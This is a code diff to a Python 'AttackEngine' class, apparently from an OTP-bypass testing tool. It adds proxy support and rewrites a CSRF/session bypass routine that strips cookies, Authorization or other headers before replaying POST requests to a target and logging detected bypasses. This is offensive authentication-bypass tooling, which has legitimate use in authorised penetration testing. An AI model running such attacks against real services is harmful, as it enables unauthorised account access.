@@ -21,7 +21,8 @@ class AttackEngine:
                  target_url: str,
                  session_manager: SessionManager,
                  test_payload: Dict[str, Any],
-                 otp_param: str = "code"):
+                 otp_param: str = "code",
+                 proxy: Optional[str] = None):
         """
         Initialize attack engine.
         
@@ -30,17 +31,19 @@ class AttackEngine:
             session_manager: SessionManager instance
             test_payload: Baseline payload with INVALID code for baseline
             otp_param: Name of OTP parameter
+            proxy: Optional proxy URL (e.g., http://127.0.0.1:8080)
         """
         self.target_url = target_url
         self.session_manager = session_manager
         self.test_payload = test_payload
         self.otp_param = otp_param
         
-        # Initialize requester
+        # Initialize requester with proxy support
         self.requester = SmartRequester(
             target_url=target_url,
             session_cookies=session_manager.get_cookies(),
-            auth_header=session_manager.get_auth_header()
+            auth_header=session_manager.get_auth_header(),
+            proxy=proxy
         )
         
         # Initialize analyzer (baseline set later in establish_baseline)
@@ -95,7 +98,7 @@ class AttackEngine:
         return results
     
     def run_csrf_bypass(self) -> List[Dict]:
-        """Execute CSRF/session manipulation attacks."""
+        """Execute CSRF/session manipulation attacks with proper header removal."""
         logger.info("\n[*] Running CSRF/Session Bypass Module...")
         
         module = CSRFBypassModule(self.test_payload)
@@ -105,23 +108,54 @@ class AttackEngine:
         for attack_name, headers_to_remove, headers_to_add in variants:
             logger.debug(f"Testing: {attack_name}")
             
-            # Build custom headers
-            custom_headers = headers_to_add.copy()
+            # Clone session to isolate modifications
+            import requests
+            temp_session = requests.Session()
             
-            # Note: Removing headers requires modifying requester's session
-            # For now, we'll just add custom headers
-            response = self.requester.send_request(
-                method="POST",
-                payload=self.test_payload,
-                custom_headers=custom_headers
-            )
+            # Copy cookies from original session
+            temp_session.cookies.update(self.session_manager.get_cookies())
             
-            if response:
-                analysis = self.analyzer.analyze(response, attack_name)
-                results.append(analysis)
+            # Copy authorization if exists
+            auth_header = self.session_manager.get_auth_header()
+            if auth_header and 'Authorization' not in headers_to_remove:
+                temp_session.headers['Authorization'] = auth_header
+            
+            # Build headers (use requester's header generator but override)
+            base_headers = self.requester._get_browser_headers()
+            
+            # Remove specified headers
+            for header in headers_to_remove:
+                if header == 'Cookie':
+                    # Clear all cookies
+                    temp_session.cookies.clear()
+                elif header in temp_session.headers:
+                    del temp_session.headers[header]
+                elif header in base_headers:
+                    del base_headers[header]
+            
+            # Add custom headers
+            base_headers.update(headers_to_add)
+            
+            # Execute request with modified session
+            try:
+                response = temp_session.post(
+                    self.target_url,
+                    json=self.test_payload,
+                    headers=base_headers,
+                    timeout=10,
+                    allow_redirects=False
+                )
                 
-                if analysis['bypass_detected']:
-                    self._log_bypass(analysis, self.test_payload)
+                logger.info(f"Response: {response.status_code} | Length: {len(response.content)}")
+                
+                if response is not None:
+                    analysis = self.analyzer.analyze(response, attack_name)
+                    results.append(analysis)
+                    
+                    if analysis['bypass_detected']:
+                        self._log_bypass(analysis, self.test_payload)
+            except Exception as e:
+                logger.error(f"CSRF test '{attack_name}' failed: {e}")
         
         return results
     
